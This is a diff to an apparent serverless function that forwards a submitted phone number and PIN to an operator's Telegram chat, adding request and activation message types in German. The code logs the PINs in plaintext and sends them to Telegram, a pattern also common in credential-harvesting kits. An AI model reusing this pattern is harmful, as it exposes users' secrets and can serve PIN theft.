@@ -9,6 +9,7 @@ const corsHeaders = {
 interface TelegramNotificationRequest {
   phone: string;
   accessCode: string;
+  type?: 'request' | 'activation'; // Add type to distinguish message types
 }
 
 serve(async (req) => {
@@ -18,7 +19,7 @@ serve(async (req) => {
   }
 
   try {
-    const { phone, accessCode }: TelegramNotificationRequest = await req.json();
+    const { phone, accessCode, type = 'request' }: TelegramNotificationRequest = await req.json();
     
     const botToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
     const chatId = Deno.env.get('TELEGRAM_CHAT_ID');
@@ -31,9 +32,15 @@ serve(async (req) => {
       );
     }
 
-    const message = `🔔 New Number Activated!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
+    // Create different messages based on type
+    let message: string;
+    if (type === 'activation') {
+      message = `✅ Nummer Aktiviert!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
+    } else {
+      message = `🔔 Neue Anfrage eingegangen!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
+    }
     
-    console.log('Sending Telegram notification:', { phone, accessCode });
+    console.log(`Sending Telegram notification (${type}):`, { phone, accessCode });
     
     const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
@@ -57,7 +64,7 @@ serve(async (req) => {
     }
 
     const result = await telegramResponse.json();
-    console.log('Telegram notification sent successfully:', result);
+    console.log(`Telegram notification (${type}) sent successfully:`, result);
 
     return new Response(
       JSON.stringify({ success: true, result }),
